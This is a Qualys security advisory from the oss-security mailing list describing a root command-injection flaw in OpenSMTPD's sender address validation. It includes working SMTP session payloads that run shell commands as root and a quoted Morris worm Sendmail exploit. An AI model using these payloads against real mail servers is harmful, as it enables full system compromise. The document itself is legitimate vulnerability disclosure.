  oss-security - LPE and RCE in OpenSMTPD            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Tue, 28 Jan From: Qualys Security Advisory <qsa@...lys.com> To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com> Subject: LPE and RCE in OpenSMTPD   Qualys Security Advisory  LPE and RCE in OpenSMTPD   ============================================================================== Contents ==============================================================================  Summary Analysis Exploitation Acknowledgments   ============================================================================== Summary ==============================================================================  We discovered a vulnerability in OpenSMTPD, OpenBSD's mail server. This vulnerability is exploitable since May (commit "switch smtpd to new grammar") and allows an attacker to execute arbitrary shell commands, as root:  - either locally, in OpenSMTPD's default configuration (which listens on   the loopback interface and only accepts mail from localhost);  - or locally and remotely, in OpenSMTPD's "uncommented" default   configuration (which listens on all interfaces and accepts external   mail).  We developed a simple proof of concept and successfully tested it against OpenBSD 6.6 (the current release) and Debian testing (Bullseye); other versions and distributions may be exploitable.   ============================================================================== Analysis ==============================================================================  OpenSMTPD's smtp_mailaddr() function is responsible for validating sender (MAIL FROM) and recipient (RCPT TO) mail addresses:  ------------------------------------------------------------------------------ static int smtp_mailaddr(struct mailaddr *maddr, char *line, int mailfrom, char **args,     const char *domain) { ....         if (!valid_localpart(maddr->user) ||             !valid_domainpart(maddr->domain)) { ....                 return (0);         }         return (1); } ------------------------------------------------------------------------------  - it calls valid_domainpart() to validate the domain name (after the @   sign) of a mail address -- this function only accepts IPv4 and IPv6   addresses, and alpha-numeric, '.', '-', and '_' characters;  - it calls valid_localpart() to validate the local part (before the @   sign) of a mail address -- this function only accepts alpha-numeric,   '.', and MAILADDR_ALLOWED characters (a white list from RFC    71 #define MAILADDR_ALLOWED        "!#$%&'*/?^`{|}~+-=_"  Among the characters in MAILADDR_ALLOWED, the ones that are also in MAILADDR_ESCAPE are later transformed into ':' characters (escaped) by mda_expand_token():    72 #define MAILADDR_ESCAPE         "!#$%&'*?`{|}~"  smtp_mailaddr()'s white-listing and mda_expand_token()'s escaping are fundamental to OpenSMTPD's security -- they prevent dangerous characters from reaching the shell that executes MDA commands (in mda_unpriv()):          execle("/bin/sh", "/bin/sh", "-c", mda_command, (char *)NULL,             mda_environ);  Mail Delivery Agents (MDAs) are responsible for delivering mail to local recipients; for example, OpenSMTPD's default MDA method is "mbox", and the corresponding MDA command is (in parse.y):          asprintf(&dispatcher->u.local.command,             "/usr/libexec/mail.local -f %%{mbox.from} %%{user.username}");  where %{user.username} is the name of an existing local user (the local part of the recipient address), and %{mbox.from} is the sender address (which would be under the complete control of an attacker if it were not for smtp_mailaddr()'s white-listing and mda_expand_token()'s escaping).  Unfortunately, we discovered a vulnerability in smtp_mailaddr()  ------------------------------------------------------------------------------ static int smtp_mailaddr(struct mailaddr *maddr, char *line, int mailfrom, char **args,     const char *domain) { ....         if (!valid_localpart(maddr->user) ||             !valid_domainpart(maddr->domain)) { ....                 if (maddr->domain[0] == '\0') {                         (void)strlcpy(maddr->domain, domain,                             sizeof(maddr->domain));                         return (1);                 }                 return (0);         }         return (1); } ------------------------------------------------------------------------------  If the local part of an address is invalid (line and if its domain name is empty (line then smtp_mailaddr() adds the default domain automatically (line and returns 1 (line although it should return 0 because the local part of the address is invalid (for example, because it contains invalid characters).  As a result, an attacker can pass dangerous characters that are not in MAILADDR_ALLOWED and not in MAILADDR_ESCAPE (';' and ' ' in particular) to the shell that executes the MDA command. For example, the following local SMTP session executes "sleep 66" as root, in OpenSMTPD's default configuration:  ------------------------------------------------------------------------------ $ nc 25 obsd66.example.org ESMTP OpenSMTPD HELO professor.falken obsd66.example.org Hello professor.falken pleased to meet you MAIL FROM:<;sleep 66;> Ok RCPT TO:<root> Destination address valid: Recipient ok DATA Enter mail, end with "." on a line by itself  How about a nice game of chess? . Message accepted for delivery QUIT Bye ------------------------------------------------------------------------------   ============================================================================== Exploitation ==============================================================================  Nevertheless, our ability to execute arbitrary shell commands through the local part of the sender address is rather limited:  - although OpenSMTPD is less restrictive than RFC the maximum   length of a local part should be 64 characters;  - the characters in MAILADDR_ESCAPE (for example, '$' and '|') are   transformed into ':' characters.  To overcome these limitations, we drew inspiration from the Morris worm which exploited the DEBUG vulnerability in Sendmail by executing the body of a mail as a shell script:  ------------------------------------------------------------------------------ debug mail from: </dev/null> rcpt to: <"|sed -e '1,/^$/'d | /bin/sh ; exit 0"> data  cd /usr/tmp cat > <<'EOF' [text of vector program] EOF cc -o rm -f  . quit ------------------------------------------------------------------------------  Indeed, the standard input of an MDA command is the mail itself: "sed" removes the headers (which were added automatically by the mail server) and "/bin/sh" executes the body.  We cannot simply reuse this command (because we cannot use the '|' and '>' characters), but we can use "read" to remove N header lines (where N is greater than the number of header lines added by the mail server) and prepend a "NOP slide" of N comment lines to the body of our mail. For example, the following remote SMTP session executes the body of our mail, as root, in OpenSMTPD's "uncommented" default configuration:  ------------------------------------------------------------------------------ $ nc 25 obsd66.example.org ESMTP OpenSMTPD HELO professor.falken obsd66.example.org Hello professor.falken pleased to meet you MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;> Ok RCPT TO:<root@...mple.org> Destination address valid: Recipient ok DATA Enter mail, end with "." on a line by itself  #0 #1 #2 #3 #4 #5 #6 #7 #8 #9 #a #b #c #d for i in W O P R; do         echo -n "($i) " && id || break done >> /root/x."`id -u`"."$$" . Message accepted for delivery QUIT Bye ------------------------------------------------------------------------------   ============================================================================== Acknowledgments ==============================================================================  We thank the OpenBSD developers for their great work and their quick response.       This message may contain confidential and privileged information. If it has been sent to you in error, please reply to advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read, copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate unsolicited promotional emails (âspamâ). If you have any concerns about this process, please contact us.  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      